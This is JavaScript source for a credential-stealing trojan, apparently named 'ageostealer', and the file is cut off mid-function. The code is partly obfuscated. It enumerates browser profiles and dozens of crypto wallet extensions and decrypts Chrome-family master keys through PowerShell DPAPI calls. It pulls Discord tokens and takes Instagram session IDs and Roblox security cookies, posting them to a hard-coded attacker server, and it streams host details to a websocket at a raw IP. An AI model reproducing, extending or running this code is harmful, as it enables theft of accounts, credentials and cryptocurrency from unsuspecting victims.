const fs = require("fs");
const path = require("path");
const httpx = require("axios");

const os = require('os');
const crypto = require("crypto");
const AdmZip = require('adm-zip');

const osu = require('node-os-utils');
const {
    execSync,
    exec: exec
} = require("child_process");

const sqlite3 = require('sqlite3').verbose();
const FormData = require('form-data')

const clipboard = require('clipboardy');
const WebSocket = require('ws');
const {
    exit
} = require("process");

const {
    WebhookClient,
    MessageAttachment,
    MessageEmbed
} = require('discord.js');

let api_url = 'https://ageostealer.wtf';
let api_auth = 'Ageox2IC58pd6m1C73x';
let name = 'Ageox2IC58pd6m1C73x';

let config = {
    'api_url': 'https://ageostealer.wtf',
    'api_auth': '293929329',
    'websocket_url': 'ws://213.255.247.174:3200'
};

const baseapi = "https://ageostealer.wtf/api";

var request = require('request');

const https = require('https');
const local = process.env.LOCALAPPDATA;
const appdata = process.env.APPDATA;
const localappdata = process.env.LOCALAPPDATA;
const discords = [];
const injection_paths = [];
const urss = require("os").userInfo().username;
var cantOpenMiner = false;
var output = `C:\\Users\\${urss}\\AppData\\Roaming\\f.exe`;
var ConfigOutput = `C:\\Users\\${urss}\\AppData\\Roaming\\config.json`;

const browser_paths = [localappdata + '\\Google\\Chrome\\User Data\\Default\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\', appdata + '\\Opera Software\\Opera Stable\\', appdata + '\\Opera Software\\Opera GX Stable\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'];

paths = [
    appdata + '\\discord\\',

    appdata + '\\discordcanary\\',

    appdata + '\\discordptb\\',

    appdata + '\\discorddevelopment\\',

    appdata + '\\lightcord\\',

    localappdata + '\\Google\\Chrome\\User Data\\Default\\',

    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',

    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',

    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',

    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',

    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',

    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',

    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',

    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',

    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',

    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',

    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',

    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',

    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',

    appdata + '\\Opera Software\\Opera Stable\\',

    appdata + '\\Opera Software\\Opera GX Stable\\',

    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',

    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',

    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',

    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',

    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',

    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',

    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',

    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',

    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',

    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',

    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',

    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',

    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',

    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',

    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',

    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',

    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',

    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',

    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',

    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',

    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',

    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',

    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',

    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',

    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',

    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',

    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',

    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',

    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',

    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',

    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',

    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',

    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',

    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',

    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',

    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',

    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',

    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',

    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',

    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'

];

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

const configg = {
    "logout": "instant",
    "inject-notify": "true",
    "logout-notify": "true",
    "init-notify": "false",
    "embed-color": 3553599,
    "disable-qr-code": "true"
}

const _0x9b6227 = {}

_0x9b6227.passwords = 0
_0x9b6227.cookies = 0
_0x9b6227.autofills = 0
_0x9b6227.wallets = 0
_0x9b6227.telegram = false

const count = _0x9b6227,

    user = {
        ram: os.totalmem(),

        version: os.version(),

        uptime: os.uptime,

        homedir: os.homedir(),

        hostname: os.hostname(),

        userInfo: os.userInfo().username,

        type: os.type(),

        arch: os.arch(),

        release: os.release(),

        roaming: process.env.APPDATA,

        local: process.env.LOCALAPPDATA,

        temp: process.env.TEMP,

        countCore: process.env.NUMBER_OF_PROCESSORS,

        sysDrive: process.env.SystemDrive,

        fileLoc: process.cwd(),

        randomUUID: crypto.randomBytes(16).toString('hex'),

        hwids: execSync('wmic csproduct get uuid').toString().split('\n')[1].trim(),

        start: Date.now(),

        debug: false,

        copyright: '<================[1295]>================>\n\n',

        url: null,
    }

_0x2afdce = {}

const walletPaths = _0x2afdce,

    _0x4ae424 = {}

_0x4ae424.Trust = '\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph'

_0x4ae424.Metamask =
    '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn'

_0x4ae424.BinanceChain =
    '\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp'

_0x4ae424.Phantom =
    '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa'

_0x4ae424.TronLink =
    '\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec'

_0x4ae424.Ronin = '\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec'

_0x4ae424.Exodus =
    '\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno'

_0x4ae424.Coin98 =
    '\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg'

_0x4ae424.Authenticator =
    '\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai'

_0x4ae424.MathWallet =
    '\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc'

_0x4ae424.YoroiWallet =
    '\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb'

_0x4ae424.GuardaWallet =
    '\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln'

_0x4ae424.JaxxxLiberty =
    '\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne'

_0x4ae424.Wombat =
    '\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih'

_0x4ae424.EVERWallet =
    '\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk'

_0x4ae424.KardiaChain =
    '\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk'

_0x4ae424.XDEFI = '\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf'

_0x4ae424.Nami = '\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo'

_0x4ae424.TerraStation =
    '\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp'

_0x4ae424.MartianAptos =
    '\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk'

_0x4ae424.TON = '\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd'

_0x4ae424.Keplr = '\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap'

_0x4ae424.CryptoCom =
    '\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj'

_0x4ae424.PetraAptos =
    '\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci'

_0x4ae424.OKX = '\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge'

_0x4ae424.Sollet =
    '\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno'

_0x4ae424.Sender =
    '\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg'

_0x4ae424.Sui = '\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil'

_0x4ae424.SuietSui =
    '\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd'

_0x4ae424.Braavos =
    '\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma'

_0x4ae424.FewchaMove =
    '\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj'

_0x4ae424.EthosSui =
    '\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli'

_0x4ae424.ArgentX =
    '\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb'

_0x4ae424.NiftyWallet =
    '\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid'

_0x4ae424.BraveWallet =
    '\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl'

_0x4ae424.EqualWallet =
    '\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac'

_0x4ae424.BitAppWallet =
    '\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi'

_0x4ae424.iWallet =
    '\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj'

_0x4ae424.AtomicWallet =
    '\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh'

_0x4ae424.MewCx = '\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm'

_0x4ae424.GuildWallet =
    '\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj'

_0x4ae424.SaturnWallet =
    '\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig'

_0x4ae424.HarmonyWallet =
    '\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib'

_0x4ae424.PaliWallet =
    '\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn'

_0x4ae424.BoltX = '\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca'

_0x4ae424.LiqualityWallet =
    '\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn'

_0x4ae424.MaiarDeFiWallet =
    '\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm'

_0x4ae424.TempleWallet =
    '\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc'

_0x4ae424.Metamask_E =
    '\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm'

_0x4ae424.Ronin_E =
    '\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk'

_0x4ae424.Yoroi_E =

    '\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb'

_0x4ae424.Authenticator_E =
    '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio'

    _0x4ae424.MetaMask_O =
    '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'

const extension = _0x4ae424,
    browserPath = [
        [
            user.local + '\\Google\\Chrome\\User Data\\Default\\',
            'Default',
            user.local + '\\Google\\Chrome\\User Data\\',
        ],
        [
            user.local + '\\Google\\Chrome\\User Data\\Profile 1\\',
            'Profile_1',
            user.local + '\\Google\\Chrome\\User Data\\',
        ],
        [
            user.local + '\\Google\\Chrome\\User Data\\Profile 2\\',
            'Profile_2',
            user.local + '\\Google\\Chrome\\User Data\\',
        ],
        [
            user.local + '\\Google\\Chrome\\User Data\\Profile 3\\',
            'Profile_3',
            user.local + '\\Google\\Chrome\\User Data\\',
        ],
        [
            user.local + '\\Google\\Chrome\\User Data\\Profile 4\\',
            'Profile_4',
            user.local + '\\Google\\Chrome\\User Data\\',
        ],
        [
            user.local + '\\Google\\Chrome\\User Data\\Profile 5\\',
            'Profile_5',
            user.local + '\\Google\\Chrome\\User Data\\',
        ],
        [
            user.local + '\\Google\\Chrome\\User Data\\Guest Profile\\',
            'Guest Profile',
            user.local + '\\Google\\Chrome\\User Data\\',
        ],
        [
            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
            'Default',
            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
        ],
        [
            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
            'Profile_1',
            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
        ],
        [
            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
            'Profile_2',
            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
        ],
        [
            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
            'Profile_3',
            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
        ],
        [
            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
            'Profile_4',
            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
        ],
        [
            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
            'Profile_5',
            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
        ],
        [
            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
            'Guest Profile',
            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
        ],
        [
            user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\',
            'Default',
            user.local + '\\Yandex\\YandexBrowser\\User Data\\',
        ],
        [
            user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
            'Profile_1',
            user.local + '\\Yandex\\YandexBrowser\\User Data\\',
        ],
        [
            user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
            'Profile_2',
            user.local + '\\Yandex\\YandexBrowser\\User Data\\',
        ],
        [
            user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
            'Profile_3',
            user.local + '\\Yandex\\YandexBrowser\\User Data\\',
        ],
        [
            user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
            'Profile_4',
            user.local + '\\Yandex\\YandexBrowser\\User Data\\',
        ],
        [
            user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
            'Profile_5',
            user.local + '\\Yandex\\YandexBrowser\\User Data\\',
        ],
        [
            user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
            'Guest Profile',
            user.local + '\\Yandex\\YandexBrowser\\User Data\\',
        ],
        [
            user.local + '\\Microsoft\\Edge\\User Data\\Default\\',
            'Default',
            user.local + '\\Microsoft\\Edge\\User Data\\',
        ],
        [
            user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
            'Profile_1',
            user.local + '\\Microsoft\\Edge\\User Data\\',
        ],
        [
            user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
            'Profile_2',
            user.local + '\\Microsoft\\Edge\\User Data\\',
        ],
        [
            user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
            'Profile_3',
            user.local + '\\Microsoft\\Edge\\User Data\\',
        ],
        [
            user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
            'Profile_4',
            user.local + '\\Microsoft\\Edge\\User Data\\',
        ],
        [
            user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
            'Profile_5',
            user.local + '\\Microsoft\\Edge\\User Data\\',
        ],
        [
            user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
            'Guest Profile',
            user.local + '\\Microsoft\\Edge\\User Data\\',
        ],
        [
            user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\',
            'Default',
            user.roaming + '\\Opera Software\\Opera Neon\\User Data\\',
        ],
        [
            user.roaming + '\\Opera Software\\Opera Stable\\',
            'Default',
            user.roaming + '\\Opera Software\\Opera Stable\\',
        ],
        [
            user.roaming + '\\Opera Software\\Opera GX Stable\\',
            'Default',
            user.roaming + '\\Opera Software\\Opera GX Stable\\',
        ],
    ],

    randomPath = `${user.fileLoc}\\${user.randomUUID}`;

fs.mkdirSync(randomPath, 484);

function debugLog(message) {
    if (user.debug === true) {
        const elapsedTime = Date.now() - user.start;
        const seconds = (elapsedTime / 1000).toFixed(1);
        const milliseconds = elapsedTime.toString();

        console.log(`${message}: ${seconds} s. / ${milliseconds} ms.`);
    }
}

async function getEncrypted() {
    for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
        if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
            continue
        }
        try {
            let _0x276965 = Buffer.from(
                JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
                .os_crypt.encrypted_key,
                'base64'
            ).slice(5)

            const _0x4ff4c6 = Array.from(_0x276965),
                _0x4860ac = execSync(
                    'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
                    _0x4ff4c6 +
                    "), $null, 'CurrentUser')"
                )
                .toString()
                .split('\r\n'),

                _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
                _0x2ed7ba = Buffer.from(_0x4a5920)

            browserPath[_0x4c3514].push(_0x2ed7ba)

        } catch (_0x32406b) {}
    }
}

function addFolder(folderPath) {
    const folderFullPath = path.join(randomPath, folderPath);

    if (!fs.existsSync(folderFullPath)) {
        try {
            fs.mkdirSync(folderFullPath, {
                recursive: true
            });
        } catch (error) {}
    }
}

function getZip(sourcePath, zipFilePath) {
    try {
        const zip = new AdmZip();

        zip.addLocalFolder(sourcePath);
        zip.writeZip('' + zipFilePath);

    } catch (error) {}
}

function copyFolder(sourcePath, destinationPath) {
    const isDestinationExists = fs.existsSync(destinationPath);
    const destinationStats = isDestinationExists && fs.statSync(destinationPath);
    const isDestinationDirectory = isDestinationExists && destinationStats.isDirectory();

    if (isDestinationDirectory) {
        addFolder(sourcePath);

        fs.readdirSync(destinationPath).forEach((file) => {
            const sourceFile = path.join(sourcePath, file);
            const destinationFile = path.join(destinationPath, file);

            copyFolder(sourceFile, destinationFile);
        });

    } else {
        fs.copyFileSync(destinationPath, path.join(randomPath, sourcePath));
    }
}

async function GetInstaData(session_id) {
    let data = {};
    let headers = {
        "Host": "i.instagram.com",
        "X-Ig-Connection-Type": "WiFi",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Ig-Capabilities": "36r/Fx8=",
        "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
        "X-Ig-App-Locale": "en",
        "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": `sessionid=${session_id};`
    };

    let response = await httpx.get(`https://i.instagram.com/api/v1/accounts/current_user/?edit=true`, {
        headers: headers
    }).catch(error => {
        return false;
    })

    data['username'] = response.data.user.username, data['verified'] = response.data.user.is_verified, data['avatar'] = response.data.user.profile_pic_url, data['sessionid'] = session_id;

    return data

}

let client;

;
(async () => {
    let response = await httpx.get(`${api_url}/check?key=${api_auth}`)

    client = new WebhookClient({
        url: response.data
    });

})()

async function SubmitInstagram(session_id) {
    let data = await GetInstaData(session_id)

    response = httpx.post(`${api_url}/api/instagram?auth=${api_auth}&ip=322`, {
        verified: data.verified,
        avatar: data.avatar,
        token: data.sessionid,
        username: data.username
    })
}

async function GetRobloxData(secret_cookie) {
    let data = {};

    let headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
        'cookie': `.ROBLOSECURITY=${secret_cookie.toString()};`,
        'origin': 'https://www.roblox.com',
        'referer': 'https://www.roblox.com',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'

    };

    let response = await httpx.get('https://www.roblox.com/mobileapi/userinfo', {
        headers: headers
    });

    data['username'] = response.data['UserName'];
    data['avatar'] = response.data['ThumbnailUrl'];
    data['robux'] = response.data['RobuxBalance'];
    data['premium'] = response.data['IsPremium'];

    return data;
}

async function SubmitRoblox(secret_cookie) {
    let data = await GetRobloxData(secret_cookie);

    let response = await httpx.post(`${api_url}/api/roblox?auth=${api_auth}`, {
        premium: data.premium,
        avatar: data.avatar,
        token: `.ROBLOSECURITY=${secret_cookie.toString()}`,
        username: data.username,
        robux: data.robux
    });
}

async function UpdateInformation(websocket) {
    const cpu = osu.cpu;
    let send_info = true;
    const sleep = s => new Promise(e => setTimeout(e, s));

    while (send_info) {
        let cords = []

        exec('tasklist', (err, stdout) => {
            for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
                if (stdout.includes(executable)) {
                    let cord = executable.split('.')[0];
                    cords.push(cord)
                }
            }

            cpu.usage().then(cpu_usage => {
                websocket.send(JSON.stringify({
                    key: api_auth,
                    hostname: os.hostname(),
                    event: 'updateinfo',
                    discords: {
                        opened: cords,
                        injected: true
                    },
                    cpu: {
                        model: os.cpus()[0].model,
                        'usage': cpu_usage
                    },
                    time: Date()
                }))
            })
        })

        await sleep(2000)
    }
}

function extractDiscordTokens() {
    const _0x102753 = {
        Discord: user.roaming + '\\discord\\Local Storage\\leveldb',

        Google:
            user.local +
            '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',

        Brave:
            user.local +
            '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',

        Yandex:
            user.local +
            '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb',

        Edge:
            user.local +
            '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb',
    }

    _0x102753['Discord CC'] =
        user.roaming + '\\discordcanary\\Local Storage\\leveldb'

    _0x102753['Discord PTB'] =
        user.roaming + '\\discordptb\\Local Storage\\leveldb'

    _0x102753['Opera Neon'] =
        user.local +
        '\\Opera Software\\Opera Neon\\User Data\\Default\\Local Storage\\leveldb'

    _0x102753['Opera Stable'] =
        user.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb'

    _0x102753['Opera GX'] =
        user.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb'

    const _0x39b4dd = _0x102753

    async function _0x71f249(_0x183cf8) {
        const _0x6f3d2a = _0x183cf8.replace(/Local Storage.*/, 'Local State'),

        _0x1839cb = JSON.parse(await fs.promises.readFile(_0x6f3d2a, 'utf8')).os_crypt.encrypted_key,
        _0x3faf23 = Buffer.from(_0x1839cb, 'base64').slice(5),
        _0x344adb = Array.from(_0x3faf23),
        _0xa78484 = execSync(
            'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
            _0x344adb +
            "), $null, 'CurrentUser')").toString().split('\r\n'),

        _0x12f096 = _0xa78484.filter((_0x56d9e6) => _0x56d9e6 != ''),
        _0x38fb08 = Buffer.from(_0x12f096)

        return _0x38fb08
    }

    function _0x369343(_0x13afc2, _0x29ec8b) {
        _0x13afc2 = _0x13afc2.split('dQw4w9WgXcQ:')[1]
        _0x13afc2 = Buffer.from(_0x13afc2, 'base64')

        const _0x355b2f = _0x13afc2.slice(3, 15),
              _0xe7032e = _0x13afc2.slice(15, _0x13afc2.length - 16),
              _0xeb7b1 = _0x13afc2.slice(_0x13afc2.length - 16, _0x13afc2.length),
              _0x1d79f4 = crypto.createDecipheriv('aes-256-gcm', _0x29ec8b, _0x355b2f)

        return (
            _0x1d79f4.setAuthTag(_0xeb7b1),
            (_0x13afc2 = _0x1d79f4.update(_0xe7032e, 'base64', 'utf-8')),
            (_0x13afc2 += _0x1d79f4.final('utf-8')),
            _0x13afc2
        )
    }

    for (let [_0x1e594c, _0x10a294] of Object.entries(_0x39b4dd)) {
        if (!fs.existsSync(_0x10a294)) {
            continue
        }

